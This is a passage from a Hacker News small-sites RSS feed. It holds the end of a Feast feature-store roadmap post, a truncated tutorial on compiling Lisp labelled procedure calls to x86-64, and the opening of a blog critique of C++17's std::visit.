href="https://uploads-ssl.webflow.com/5f96e7a5ea43eef2c8a67238/5f97254aa9c2f27c4a6393bf_-C6hAXrV6r0JnUj72l9bINmweqgwUXXw_HATEc1UMeN9SCeW_9kPDUvCtr2dpRTOMW7Un4gghBGdhR4aoJscmJEMHORcG2xu8Fh4QqLMspjN5jCbi6muBNYOId56K4tbQCsGj1hy.png" target="_blank"><p><img src="https://uploads-ssl.webflow.com/5f96e7a5ea43eef2c8a67238/5f97254aa9c2f27c4a6393bf_-C6hAXrV6r0JnUj72l9bINmweqgwUXXw_HATEc1UMeN9SCeW_9kPDUvCtr2dpRTOMW7Un4gghBGdhR4aoJscmJEMHORcG2xu8Fh4QqLMspjN5jCbi6muBNYOId56K4tbQCsGj1hy.png" alt=""></p></a><figcaption>Feast is the bridge between models and data</figcaption></figure><h3>Next Steps</h3><p>Our vision for Feast is not only ambitious, but actionable. Our next release, Feast 0.8, is the product of collaborating with both our open source community and our friends over at <a href="https://tecton.ai/">Tecton</a>.</p><ol role="list"><li><strong>Python-first: </strong>We are migrating all core logic to Python, starting with training dataset retrieval and job management, providing a more responsive development experience.</li><li><strong>Modular ingestion: </strong>We are shifting to managing batch and streaming ingestion separately, leading to more actionable metrics, logs, and statistics and an easier to understand and operate system.</li><li><strong>Support for AWS: </strong>We are replacing GCP-specific technologies like Beam on Dataflow with Spark and adding native support for running Feast on AWS, our first steps toward cloud-agnosticism.&nbsp;&nbsp;</li><li><strong>Data-source integrations: </strong>We are introducing support for a host of new data sources (Kinesis, Kafka, S3, GCS, BigQuery) and data formats (Parquet, JSON, Avro), ensuring teams can seamlessly integrate Feast into their existing data-infrastructure.</li></ol><h3>Get involved</h3><p>We‚Äôve been inspired by the soaring community interest in and contributions to Feast. If you‚Äôre curious to learn more about our mission to build a best-in-class feature store, or&nbsp;are looking to build your own: Check out our resources, say hello, and get involved!<br></p><ul role="list"><li>Project website: <a href="https://feast.dev/">feast.dev</a></li><li>Come and say hello to us in <a href="https://join.slack.com/t/kubeflow/shared_invite/zt-cpr020z4-PfcAue_2nw67~iIDy7maAQ">#Feast</a></li><li>Our documentation: <a href="https://docs.feast.dev/">docs.feast.dev</a></li><li>GitHub repository: <a href="https://github.com/feast-dev/feast">feast-dev/feast</a>‚Äç</li></ul><p>‚Äç</p></div></div></div></div>]]>
            </description>
            <link>https://blog.feast.dev/post/a-state-of-feast</link>
            <guid isPermaLink="false">hacker-news-small-sites-24931596</guid>
            <pubDate>Thu, 29 Oct 2020 15:33:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Compiling a Lisp to x86-64: Labelled procedure calls]]>
            </title>
            <description>
<![CDATA[
Score 92 | Comments 13 (<a href="https://news.ycombinator.com/item?id=24931577">thread link</a>) | @tekknolagi
<br/>
October 29, 2020 | https://bernsteinbear.com/blog/compiling-a-lisp-11/ | <a href="https://web.archive.org/web/*/https://bernsteinbear.com/blog/compiling-a-lisp-11/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p><span data-nosnippet="">
<em><a href="https://bernsteinbear.com/blog/compiling-a-lisp-0/">first</a></em> ‚Äì <em><a href="https://bernsteinbear.com/blog/compiling-a-lisp-10/">previous</a></em>
</span></p>

<p>Welcome back to the Compiling a Lisp series. Last time, we learned about Intel
instruction encoding. This time, we‚Äôre going to use that knowledge to compile
procedure calls.</p>

<p>The usual function expression in Lisp is a <code>lambda</code> ‚Äî an anonymous function
that can take arguments and close over variables. Procedure calls are <em>not</em>
this. They are simpler constructs that just take arguments and return values.</p>

<p>We‚Äôre adding procedure calls first as a stepping stone to full closure support.
This will help us get some kind of internal calling convention established and
stack manipulation figured out before things get too complicated.</p>

<p>After this post, we will be able to support programs like the following:</p>

<div><div><pre><code><span>(</span><span>labels</span> <span>((</span><span>add</span> <span>(</span><span>code</span> <span>(</span><span>x</span> <span>y</span><span>)</span> <span>(</span><span>+</span> <span>x</span> <span>y</span><span>)))</span>
         <span>(</span><span>sub</span> <span>(</span><span>code</span> <span>(</span><span>x</span> <span>y</span><span>)</span> <span>(</span><span>-</span> <span>x</span> <span>y</span><span>))))</span>
    <span>(</span><span>labelcall</span> <span>sub</span> <span>4</span> <span>(</span><span>labelcall</span> <span>add</span> <span>1</span> <span>2</span><span>)))</span>
<span>; =&gt; 1</span>
</code></pre></div></div>

<p>and even this snazzy factorial function:</p>

<div><div><pre><code><span>(</span><span>labels</span> <span>((</span><span>factorial</span> <span>(</span><span>code</span> <span>(</span><span>x</span><span>)</span> 
            <span>(</span><span>if</span> <span>(</span><span>&lt;</span> <span>x</span> <span>2</span><span>)</span> <span>1</span> <span>(</span><span>*</span> <span>x</span> <span>(</span><span>labelcall</span> <span>factorial</span> <span>(</span><span>-</span> <span>x</span> <span>1</span><span>)))))))</span>
    <span>(</span><span>labelcall</span> <span>factorial</span> <span>5</span><span>))</span>
<span>; =&gt; 120</span>
</code></pre></div></div>

<p>These are fairly pedestrian snippets of code but they demonstrate some new
features we are adding, like:</p>

<ul>
  <li>A new <code>labels</code> form that all programs will now have to look like</li>
  <li>A new <code>code</code> form for describing procedures and their parameters</li>
  <li>A new <code>labelcall</code> expression for calling procedures</li>
</ul>

<p>Ghuloum does not explain why he does this, but I imagine that the <code>labels</code> form
was chosen over allowing multiple separate top-level bindings because it is
easier to parse and traverse.</p>

<h3 id="big-ideas">Big ideas</h3>

<p>In order to compile a program, we are going to traverse every binding in the
<code>labels</code>. For each binding, we will generate code for each <code>code</code> object.</p>

<p>Compiling <code>code</code> objects requires making an environment for their parameters.
We‚Äôll establish a calling convention later so that our compiler knows where to
find the parameters.</p>

<p>Then, once we‚Äôve emitted all the code for the bindings, we will compile the
body. The body may, but is not required to, contain a <code>labelcall</code> expression.</p>

<p>In order to compile a <code>labelcall</code> expression, we will compile all of the
arguments provided, save them in consecutive locations on the stack, and then
emit a <code>call</code> instruction.</p>

<p>When all of these pieces come together, the resulting machine code will look
something like this:</p>

<div><div><pre><code>mov rsi, rdi  # prologue
label0:
  label0_code
label1:
  label1_code
main:
  main_code
</code></pre></div></div>

<p>You can see that all of the <code>code</code> objects will be compiled in sequence,
followed by the body of the <code>labels</code> form.</p>

<s>
Because I have not yet figured out how to start executing at somewhere other
than the beginning of the generated code, and because I don't store generated
code in any intermediate buffers, and because we don't know the sizes of any
code in advance, I do this funky thing where I emit a `jmp` to the body code.

If you, dear reader, have a better solution, please let me know.
</s>

<p><strong>Edit:</strong> <em>jsmith45</em> gave me the encouragement I needed to work on this again.
It turns out that storing the code offset of the beginning of the <code>main_code</code>
(the <code>labels</code> body) adding that to the <code>buf-&gt;address</code> works just fine. I‚Äôll
explain more below.</p>

<h3 id="a-calling-convention">A calling convention</h3>

<p>We‚Äôre not going to use the System V AMD64 ABI. That calling convention requires
that parameters are passed first in certain registers, and then on the stack.
Instead, we will pass all parameters on the stack.</p>

<p>This makes our code simpler, but it also means that at some point later on, we
will have to add a different kind of calling convention so that we can call
foreign functions (like <code>printf</code>, or <code>exit</code>, or something). Those functions
expect their parameters in registers. We‚Äôll worry about that later.</p>

<p>If we borrow and adapt the excellent diagrams from the Ghuloum tutorial, this
means that right before we make a procedure call, our stack will look like
this:</p>

<blockquote>
  <p>Stack illustration courtesy of <a href="https://leonardschuetz.ch/">Leonard</a>.</p>
</blockquote>

<p>You can see the first return point at <code>[rsp]</code>. This is the return point placed
by the caller of the <em>current</em> function.</p>

<p>Above that are whatever local variables we have declared with <code>let</code> or perhaps
are intermediate values from some computation.</p>

<p>Above that is a blank space reserved for the second return point. This is the
return point for the <em>about-to-be-called</em> function. The <code>call</code> instruction will
fill in after evaluating all the arguments.</p>

<p>Above the return point are all the outgoing arguments. They will appear as
locals for the procedure being called.</p>

<p>Finally, above the arguments, is untouched free stack space.</p>

<p>The <code>call</code> instruction decrements <code>rsp</code> and then writes to <code>[rsp]</code>. This means
that if we just emitted a <code>call</code>, the first local would be overwritten. No
good. Worse, the way the stack would be laid out would mean that the locals
would look like arguments.</p>

<p>In order to solve this problem, we need to first adjust <code>rsp</code> to point to the
last local. That way the decrement will move it below the local and the return
address will go between the locals and the arguments.</p>

<p>After the <code>call</code> instruction, the stack will look different. Nothing will have
actually changed, except for <code>rsp</code>. This change to <code>rsp</code> means that the callee
has a different view:</p>

<blockquote>
  <p>Stack illustration courtesy of <a href="https://leonardschuetz.ch/">Leonard</a>.</p>
</blockquote>

<p>The empty colored in spaces below the return point indicate that the values on
the stack are ‚Äúhidden‚Äù from view, since they are above (higher addresses than)
<code>[rsp]</code>. The called function will <em>not</em> be able to access those values.</p>

<p>If the called function wants to use one of its arguments, it can pull it off
the stack from its designated location.</p>

<blockquote>
  <p>One unfortunate consequence of this calling convention is that Valgrind does
not understand it. Valgrind cannot understand that the caller has placed data
on the stack specifically for the callee to read it, and thinks this is a
move/jump of an uninitialized value. This means that we get some errors now
on these labelcall tests.</p>
</blockquote>

<p>Eventually, when the function returns, the <code>ret</code> instruction will pop the
return point off the stack and jump to it. This will bring us back to the
previous call frame.</p>

<p>That‚Äôs that! I have yet to find a good tool that will let me visualize the
stack as a program is executing. GDB probably has a mode hidden away somewhere
undocumented that does exactly this. Cutter sort of does, but it‚Äôs finicky in
ways I don‚Äôt really understand. Maybe one day <a href="http://akkartik.name/">Kartik</a>‚Äôs
x86-64 Mu fork will be able to do this.</p>

<h3 id="building-procedure-calls-in-small-pieces">Building procedure calls in small pieces</h3>

<p>In order for this set of changes to make sense, I am going to explain all of
the pieces one at a time, top-down.</p>

<p>First, we‚Äôll look at the new-and-improved <code>Compile_entry</code>, which has been
updated to handle the <code>labels</code> form. This will do the usual Lisp entrypoint
setup and some checks about the structure of the AST.</p>

<p>Then, we‚Äôll actually look at compiling the <code>labels</code>. This means going through
the bindings one-by-one and compiling their <code>code</code> objects.</p>

<p>Then, we‚Äôll look at what it means to compile a <code>code</code> object. Hint: it‚Äôs very
much like <code>let</code>.</p>

<p>Last, we‚Äôll tie it all together when compiling the body of the <code>labels</code> form.</p>

<h3 id="compiling-the-entrypoint">Compiling the entrypoint</h3>

<p>Most of this code is checking. What used to just compile an expression now
validates that what we‚Äôve passed in at least vaguely looks like a well-formed
<code>labels</code> form before picking it into its component parts: the <code>bindings</code> and
the <code>body</code>.</p>

<div><div><pre><code><span>int</span> <span>Compile_entry</span><span>(</span><span>Buffer</span> <span>*</span><span>buf</span><span>,</span> <span>ASTNode</span> <span>*</span><span>node</span><span>)</span> <span>{</span>
  <span>assert</span><span>(</span><span>AST_is_pair</span><span>(</span><span>node</span><span>)</span> <span>&amp;&amp;</span> <span>"program must have labels"</span><span>);</span>
  <span>// Assume it's (labels ...)</span>
  <span>ASTNode</span> <span>*</span><span>labels_sym</span> <span>=</span> <span>AST_pair_car</span><span>(</span><span>node</span><span>);</span>
  <span>assert</span><span>(</span><span>AST_is_symbol</span><span>(</span><span>labels_sym</span><span>)</span> <span>&amp;&amp;</span> <span>"program must have labels"</span><span>);</span>
  <span>assert</span><span>(</span><span>AST_symbol_matches</span><span>(</span><span>labels_sym</span><span>,</span> <span>"labels"</span><span>)</span> <span>&amp;&amp;</span>
         <span>"program must have labels"</span><span>);</span>
  <span>ASTNode</span> <span>*</span><span>args</span> <span>=</span> <span>AST_pair_cdr</span><span>(</span><span>node</span><span>);</span>
  <span>ASTNode</span> <span>*</span><span>bindings</span> <span>=</span> <span>operand1</span><span>(</span><span>args</span><span>);</span>
  <span>assert</span><span>(</span><span>AST_is_pair</span><span>(</span><span>bindings</span><span>)</span> <span>||</span> <span>AST_is_nil</span><span>(</span><span>bindings</span><span>));</span>
  <span>ASTNode</span> <span>*</span><span>body</span> <span>=</span> <span>operand2</span><span>(</span><span>args</span><span>);</span>
  <span>return</span> <span>Compile_labels</span><span>(</span><span>buf</span><span>,</span> <span>bindings</span><span>,</span> <span>body</span><span>,</span> <span>/*labels=*/</span><span>NULL</span><span>);</span>
<span>}</span>
</code></pre></div></div>
<p><code>Compile_entry</code> dispatches to <code>Compile_labels</code> for iterating over all of the
labels. <code>Compile_labels</code> is a recursive function that keeps track of all the
labels so far in its arguments, so we start it off with an empty <code>labels</code>
environment.</p>

<h3 id="compiling-labels">Compiling labels</h3>

<p>In <code>Compile_labels</code>, we have first a base case: if there are no labels we
should just emit the body.</p>

<div><div><pre><code><span>int</span> <span>Compile_labels</span><span>(</span><span>Buffer</span> <span>*</span><span>buf</span><span>,</span> <span>ASTNode</span> <span>*</span><span>bindings</span><span>,</span> <span>ASTNode</span> <span>*</span><span>body</span><span>,</span>
                   <span>Env</span> <span>*</span><span>labels</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span><span>AST_is_nil</span><span>(</span><span>bindings</span><span>))</span> <span>{</span>
    <span>buf</span><span>-&gt;</span><span>entrypoint</span> <span>=</span> <span>Buffer_len</span><span>(</span><span>buf</span><span>);</span>
    <span>// Base case: no bindings. Compile the body</span>
    <span>Buffer_write_arr</span><span>(</span><span>buf</span><span>,</span> <span>kEntryPrologue</span><span>,</span> <span>sizeof</span> <span>kEntryPrologue</span><span>);</span>
    <span>_</span><span>(</span><span>Compile_expr</span><span>(</span><span>buf</span><span>,</span> <span>body</span><span>,</span> <span>/*stack_index=*/</span><span>-</span><span>kWordSize</span><span>,</span> <span>/*varenv=*/</span><span>NULL</span><span>,</span>
                   <span>labels</span><span>));</span>
    <span>Buffer_write_arr</span><span>(</span><span>buf</span><span>,</span> <span>kFunctionEpilogue</span><span>,</span> <span>sizeof</span> <span>kFunctionEpilogue</span><span>);</span>
    <span>return</span> <span>0</span><span>;</span>
  <span>}</span>
  <span>// ...</span>
<span>}</span>
</code></pre></div></div>

<p>We also set the buffer entrypoint location to the position where we‚Äôre going to
emit the body of the <code>labels</code>. We‚Äôll use this later when executing, or later in
the series when we emit ELF binaries. You‚Äôll have to add a field <code>word
entrypoint</code> to your <code>Buffer</code> struct.</p>

<p>We pass in an empty <code>varenv</code>, since we are not accumulating any locals along
the way; only labels. For the same reason, we give a <code>stack_index</code> of
<code>-kWordSize</code> ‚Äî the first slot.</p>

<p>If we <em>do</em> have labels, on the other hand, we should deal with the first label.
This means:</p>

<ul>
  <li>pulling out the name and the code object</li>
  <li>binding the name to the <code>code</code> location (the current location)</li>
  <li>compiling the <code>code</code></li>
</ul>

<p>And then from there we deal with the others recursively.</p>

<div><div><pre><code><span>int</span> <span>Compile_labels</span><span>(</span><span>Buffer</span> <span>*</span><span>buf</span><span>,</span> <span>ASTNode</span> <span>*</span><span>bindings</span><span>,</span> <span>ASTNode</span> <span>*</span><span>body</span><span>,</span>
                   <span>Env</span> <span>*</span><span>labels</span><span>)</span> <span>{</span>
  <span>// ....</span>
  <span>assert</span><span>(</span><span>AST_is_pair</span><span>(</span><span>bindings</span><span>));</span>
  <span>// Get the next binding</span>
  <span>ASTNode</span> <span>*</span><span>binding</span> <span>=</span> <span>AST_pair_car</span><span>(</span><span>bindings</span><span>);</span>
  <span>ASTNode</span> <span>*</span><span>name</span> <span>=</span> <span>AST_pair_car</span><span>(</span><span>binding</span><span>);</span>
  <span>assert</span><span>(</span><span>AST_is_symbol</span><span>(</span><span>name</span><span>));</span>
  <span>ASTNode</span> <span>*</span><span>binding_code</span> <span>=</span> <span>AST_pair_car</span><span>(</span><span>AST_pair_cdr</span><span>(</span><span>binding</span><span>));</span>
  <span>word</span> <span>function_location</span> <span>=</span> <span>Buffer_len</span><span>(</span><span>buf</span><span>);</span>
  <span>// Bind the name to the location in the instruction stream</span>
  <span>Env</span> <span>entry</span> <span>=</span> <span>Env_bind</span><span>(</span><span>AST_symbol_cstr</span><span>(</span><span>name</span><span>),</span> <span>function_location</span><span>,</span> <span>labels</span><span>);</span>
  <span>// Compile the binding function</span>
  <span>_</span><span>(</span><span>Compile_code</span><span>(</span><span>buf</span><span>,</span> <span>binding_code</span><span>,</span> <span>&amp;</span><span>entry</span><span>));</span>
  <span>return</span> <span>Compile_labels</span><span>(</span><span>buf</span><span>,</span> <span>AST_pair_cdr</span><span>(</span><span>binding‚Ä¶</span></code></pre></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://bernsteinbear.com/blog/compiling-a-lisp-11/">https://bernsteinbear.com/blog/compiling-a-lisp-11/</a></em></p>]]>
            </description>
            <link>https://bernsteinbear.com/blog/compiling-a-lisp-11/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24931577</guid>
            <pubDate>Thu, 29 Oct 2020 15:31:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Std: Visit is everything wrong with modern C++]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24931552">thread link</a>) | @mmm_grayons
<br/>
October 29, 2020 | https://bitbashing.io/std-visit.html | <a href="https://web.archive.org/web/*/https://bitbashing.io/std-visit.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    <!--
Sorry once again for the infrequent posts.
I've been busy.
Originally, because I was supposed to get married this summer.
Then because my fianc√©e cheated on me while I was watching my grandfather die
and moved in with the other guy the following week.
So that's been fun, but I'm trying to get back into some more productive habits.
Hopefully that includes blogging regularly.
-->

<h2 id="sum-types-and-you">Sum Types and You</h2>

<p>Let‚Äôs talk about a simple, yet powerful concept in programming: <em>sum types</em>.<sup id="fnref:1"><a href="#fn:1">1</a></sup></p>

<p>A sum type, also called a <em>discriminated union</em>,
can hold one (and only one) of several types of things.
For example, consider some settings in an
<a href="https://en.wikipedia.org/wiki/INI_file">INI</a>-like configuration file.
Let‚Äôs say that each setting must be a string, an integer, or a Boolean value.
If we wanted to roll our own solution in C++, we might write something resembling:</p>

<div><pre><code><span>struct</span> <span>Setting</span> <span>{</span>
    <span>union</span> <span>{</span>
        <span>string</span> <span>str</span><span>;</span>
        <span>int</span> <span>num</span><span>;</span>
        <span>bool</span> <span>b</span><span>;</span>
    <span>};</span>
    <span>enum</span> <span>Type</span> <span>{</span> <span>Str</span><span>,</span> <span>Int</span><span>,</span> <span>Bool</span> <span>};</span>
    <span>Type</span> <span>tag</span><span>;</span>
<span>};</span>

<span>// Map settings to their names.
</span><span>using</span> <span>Settings</span> <span>=</span> <span>unordered_map</span><span>&lt;</span><span>string</span><span>,</span> <span>Setting</span><span>&gt;</span><span>;</span>
</code></pre>
</div>

<p>Here be dragons, though, since we must always remember to:</p>

<ul>
  <li>
    <p>Update <code>tag</code> whenever assigning a new value.</p>
  </li>
  <li>
    <p>Only retrieve the correct type from the union (according to <code>tag</code>).</p>
  </li>
  <li>
    <p>Call constructors and destructors at appropriate times for all non-trivial types.
(<code>string</code> is the only one here, but you could imagine similar
scenarios with others.)</p>
  </li>
</ul>

<p>If a step is ever forgotten, the object falls into an
inconsistent state and there shall be wailing and gnashing of teeth.
You could encapsulate all this trickery and interact with the type
through a series of methods‚Äîe.g., <code>getType()</code>, <code>asBool()</code>,
<code>asString()</code>, and so on‚Äîbut this is quite verbose.
It also just shifts the problem onto whoever implements these methods; they
still need to carefully maintain the invariants with no help from the language.</p>

<p>It would be much nicer if a general-purpose sum type was provided by the standard
library.
In C++17, we finally get one!
It‚Äôs called <a href="http://en.cppreference.com/w/cpp/utility/variant"><code>std::variant</code></a>.
Let‚Äôs take a look.</p>

<h2 id="using-stdvariant">Using <code>std::variant</code></h2>

<p><code>variant</code> is a class template that takes, as template parameters, the types
it could hold.
For the example above,
we could define a setting as a <code><span>variant</span><span>&lt;</span><span>string</span><span>,</span> <span>int</span><span>,</span> <span>bool</span><span>&gt;</span></code>.
Assigning a value to a <code>variant</code> works just like you might expect:</p>
<div><pre><code><span>variant</span><span>&lt;</span><span>string</span><span>,</span> <span>int</span><span>,</span> <span>bool</span><span>&gt;</span> <span>mySetting</span> <span>=</span> <span>string</span><span>(</span><span>"Hello!"</span><span>);</span> <span>// Or,
</span><span>mySetting</span> <span>=</span> <span>42</span><span>;</span> <span>// Or,
</span><span>mySetting</span> <span>=</span> <span>false</span><span>;</span>
</code></pre>
</div>

<p>Once we put a value into a <code>variant</code>, we‚Äôll eventually want to look at what that
value is, and just as importantly, what the type of the value is.
This is where the fun begins.
Some languages offer dedicated <em>pattern matching</em> syntax for the task,
such as:</p>
<div><pre><code><span>match</span> <span>(</span><span>theSetting</span><span>)</span> <span>{</span>
    <span>Setting</span><span>::</span><span>Str</span><span>(</span><span>s</span><span>)</span> <span>=&gt;</span>
        <span>println!</span><span>(</span><span>"A string: {}"</span><span>,</span> <span>s</span><span>),</span>
    <span>Setting</span><span>::</span><span>Int</span><span>(</span><span>n</span><span>)</span> <span>=&gt;</span>
        <span>println!</span><span>(</span><span>"An integer: {}"</span><span>,</span> <span>n</span><span>),</span>
    <span>Setting</span><span>::</span><span>Bool</span><span>(</span><span>b</span><span>)</span> <span>=&gt;</span>
        <span>println!</span><span>(</span><span>"A boolean: {}"</span><span>,</span> <span>b</span><span>),</span>
<span>};</span>
</code></pre>
</div>
<p>but this didn‚Äôt make the cut for C++17.<sup id="fnref:2"><a href="#fn:2">2</a></sup>
Instead we‚Äôre given a companion function called <code>std::visit</code>.
It takes the <code>variant</code> you want to examine, along with
some <em>visitor</em> that is callable for each type in the variant.</p>

<p>How do we define such a visitor?
One way is to create an object that overloads the call operator
for relevant types:</p>
<div><pre><code><span>struct</span> <span>SettingVisitor</span> <span>{</span>
    <span>void</span> <span>operator</span><span>()(</span><span>const</span> <span>string</span><span>&amp;</span> <span>s</span><span>)</span> <span>const</span> <span>{</span>
        <span>printf</span><span>(</span><span>"A string: %s</span><span>\n</span><span>"</span><span>,</span> <span>s</span><span>.</span><span>c_str</span><span>());</span>
    <span>}</span>

    <span>void</span> <span>operator</span><span>()(</span><span>const</span> <span>int</span> <span>n</span><span>)</span> <span>const</span> <span>{</span>
        <span>printf</span><span>(</span><span>"An integer: %d</span><span>\n</span><span>"</span><span>,</span> <span>n</span><span>);</span>
    <span>}</span>

    <span>void</span> <span>operator</span><span>()(</span><span>const</span> <span>bool</span> <span>b</span><span>)</span> <span>const</span> <span>{</span>
        <span>printf</span><span>(</span><span>"A boolean: %d</span><span>\n</span><span>"</span><span>,</span> <span>b</span><span>);</span>
    <span>}</span>
<span>};</span>
</code></pre>
</div>

<p>This seems terribly verbose, and it gets even worse
if we want our visitor to capture or modify some other state.
Hmm‚Äî<a href="https://stackoverflow.com/a/7627218">lambdas</a> are perfect
for capturing state.
What if we could build a visitor from those?</p>
<div><pre><code><span>make_visitor</span><span>(</span>
    <span>[</span><span>&amp;</span><span>](</span><span>const</span> <span>string</span><span>&amp;</span> <span>s</span><span>)</span> <span>{</span>
        <span>printf</span><span>(</span><span>"string: %s</span><span>\n</span><span>"</span><span>,</span> <span>s</span><span>.</span><span>c_str</span><span>());</span>
        <span>// ...
</span>    <span>},</span>
    <span>[</span><span>&amp;</span><span>](</span><span>const</span> <span>int</span> <span>d</span><span>)</span> <span>{</span>
        <span>printf</span><span>(</span><span>"integer: %d</span><span>\n</span><span>"</span><span>,</span> <span>d</span><span>);</span>
        <span>// ...
</span>    <span>},</span>
    <span>[</span><span>&amp;</span><span>](</span><span>const</span> <span>bool</span> <span>b</span><span>)</span> <span>{</span>
        <span>printf</span><span>(</span><span>"bool: %d</span><span>\n</span><span>"</span><span>,</span> <span>b</span><span>);</span>
        <span>// ...
</span>    <span>}</span>
<span>)</span>
</code></pre>
</div>
<p>That‚Äôs a bit better, but the standard library doesn‚Äôt provide any sort of
<code>make_visitor</code> to combine the lambdas into a callable object for us.
We‚Äôll need to define it ourselves.</p>

<div><pre><code><span>template</span> <span>&lt;</span><span>class</span><span>...</span> <span>Fs</span><span>&gt;</span>
<span>struct</span> <span>overload</span><span>;</span>

<span>template</span> <span>&lt;</span><span>class</span> <span>F0</span><span>,</span> <span>class</span><span>...</span> <span>Frest</span><span>&gt;</span>
<span>struct</span> <span>overload</span><span>&lt;</span><span>F0</span><span>,</span> <span>Frest</span><span>...</span><span>&gt;</span> <span>:</span> <span>F0</span><span>,</span> <span>overload</span><span>&lt;</span><span>Frest</span><span>...</span><span>&gt;</span>
<span>{</span>
    <span>overload</span><span>(</span><span>F0</span> <span>f0</span><span>,</span> <span>Frest</span><span>...</span> <span>rest</span><span>)</span> <span>:</span> <span>F0</span><span>(</span><span>f0</span><span>),</span> <span>overload</span><span>&lt;</span><span>Frest</span><span>...</span><span>&gt;</span><span>(</span><span>rest</span><span>...)</span> <span>{}</span>

    <span>using</span> <span>F0</span><span>::</span><span>operator</span><span>();</span>
    <span>using</span> <span>overload</span><span>&lt;</span><span>Frest</span><span>...</span><span>&gt;::</span><span>operator</span><span>();</span>
<span>};</span>

<span>template</span> <span>&lt;</span><span>class</span> <span>F0</span><span>&gt;</span>
<span>struct</span> <span>overload</span><span>&lt;</span><span>F0</span><span>&gt;</span> <span>:</span> <span>F0</span>
<span>{</span>
    <span>overload</span><span>(</span><span>F0</span> <span>f0</span><span>)</span> <span>:</span> <span>F0</span><span>(</span><span>f0</span><span>)</span> <span>{}</span>

    <span>using</span> <span>F0</span><span>::</span><span>operator</span><span>();</span>
<span>};</span>

<span>template</span> <span>&lt;</span><span>class</span><span>...</span> <span>Fs</span><span>&gt;</span>
<span>auto</span> <span>make_visitor</span><span>(</span><span>Fs</span><span>...</span> <span>fs</span><span>)</span>
<span>{</span>
    <span>return</span> <span>overload</span><span>&lt;</span><span>Fs</span><span>...</span><span>&gt;</span><span>(</span><span>fs</span><span>...);</span>
<span>}</span>
</code></pre>
</div>

<p>Here we use C++11‚Äôs <a href="http://en.cppreference.com/w/cpp/language/parameter_pack">variadic templates</a>.
They must be defined recursively, so we create some base case <code>F0</code>,
then use that to define a cascading set of constructors for <code>overload</code>,
each of which peels off a lambda argument and adds it to the type
as a call operator.</p>

<p>If this seems troublesome, fear not! C++17 will offer a new syntax
that reduces all of the above to:</p>
<div><pre><code><span>template</span><span>&lt;</span><span>class</span><span>...</span> <span>Ts</span><span>&gt;</span> <span>struct</span> <span>overloaded</span> <span>:</span> <span>Ts</span><span>...</span> <span>{</span> <span>using</span> <span>Ts</span><span>::</span><span>operator</span><span>()...;</span> <span>};</span>
<span>template</span><span>&lt;</span><span>class</span><span>...</span> <span>Ts</span><span>&gt;</span> <span>overloaded</span><span>(</span><span>Ts</span><span>...)</span> <span>-&gt;</span> <span>overloaded</span><span>&lt;</span><span>Ts</span><span>...</span><span>&gt;</span><span>;</span>
</code></pre>
</div>
<p>Easy, right? But if don‚Äôt like any of these options, you could
use C++17‚Äôs compile-time conditionals instead:</p>
<div><pre><code><span>[](</span><span>auto</span><span>&amp;</span> <span>arg</span><span>)</span> <span>{</span>
    <span>using</span> <span>T</span> <span>=</span> <span>std</span><span>::</span><span>decay_t</span><span>&lt;</span><span>decltype</span><span>(</span><span>arg</span><span>)</span><span>&gt;</span><span>;</span>

    <span>if</span> <span>constexpr</span> <span>(</span><span>std</span><span>::</span><span>is_same_v</span><span>&lt;</span><span>T</span><span>,</span> <span>string</span><span>&gt;</span><span>)</span> <span>{</span>
        <span>printf</span><span>(</span><span>"string: %s</span><span>\n</span><span>"</span><span>,</span> <span>arg</span><span>.</span><span>c_str</span><span>());</span>
        <span>// ...
</span>    <span>}</span>
    <span>else</span> <span>if</span> <span>constexpr</span> <span>(</span><span>std</span><span>::</span><span>is_same_v</span><span>&lt;</span><span>T</span><span>,</span> <span>int</span><span>&gt;</span><span>)</span> <span>{</span>
        <span>printf</span><span>(</span><span>"integer: %d</span><span>\n</span><span>"</span><span>,</span> <span>arg</span><span>);</span>
        <span>// ...
</span>    <span>}</span>
    <span>else</span> <span>if</span> <span>constexpr</span> <span>(</span><span>std</span><span>::</span><span>is_same_v</span><span>&lt;</span><span>T</span><span>,</span> <span>bool</span><span>&gt;</span><span>)</span> <span>{</span>
        <span>printf</span><span>(</span><span>"bool: %d</span><span>\n</span><span>"</span><span>,</span> <span>arg</span><span>);</span>
        <span>// ...
</span>    <span>}</span>
<span>}</span>
</code></pre>
</div>

<p>Much better, no?</p>

<h2 id="no">No.</h2>

<p>The rigmarole needed for <code>std::visit</code> is entirely insane.
We started with a simple goal: look at the contents of a sum type.
To accomplish this meager mission, we had to:</p>

<ol>
  <li>
    <p>Define a function object, which requires a lot of
boilerplate, <em>or</em></p>
  </li>
  <li>Define our behavior with lambdas, which required:
    <ul>
      <li>An understanding of variadic templates, in all their recursively-defined fun, <em>or</em></li>
      <li>A familiarity with variadic <code>using</code> declarations, fresh on the scene from C++17.</li>
    </ul>

    <p><em>or</em></p>
  </li>
  <li>Use compile-time conditionals, which require you to know
about‚Äîand grok‚Äîthe new <code><span>constexpr</span> <span>if</span></code> syntax, along with
<code>type_traits</code> fun like
<code>std::decay</code>.</li>
</ol>

<p>None of these concepts are too enigmatic if you‚Äôre an experienced C++ developer,
but several are certainly ‚Äúadvanced‚Äù features of the language.
Things have really gone sideways if we need to know so much
to do something so simple.</p>

<h2 id="how-did-we-get-here">How did we get here?</h2>

<p>My goal isn‚Äôt to disparage the folks on the ISO C++ committee
who picked this approach.
I‚Äôve had beers with some of them,
and they‚Äôre smart, kind, hardworking people.
I‚Äôm sure that I‚Äôm missing important context since I‚Äôve never sat in on a
standards meeting or read all of the relevant
<a href="http://www.open-std.org/jtc1/sc22/wg21/docs/papers/">committee papers</a>.
But from an outsider‚Äôs perspective, the disparity in complexity between the
problem being solved (‚ÄúWhat‚Äôs in here?‚Äù)
and the solutions is just nuts.
How do you teach this without overwhelming a beginner with all this other‚Ä¶
stuff?
Is it expected to be common knowledge for your everyday programmer?
(And if the goal of adding <code>variant</code> to the standard library <em>isn‚Äôt</em> to
make it a tool for the masses, shouldn‚Äôt it be?)
The very least C++17 could do‚Äîif the committee didn‚Äôt have the time or resources
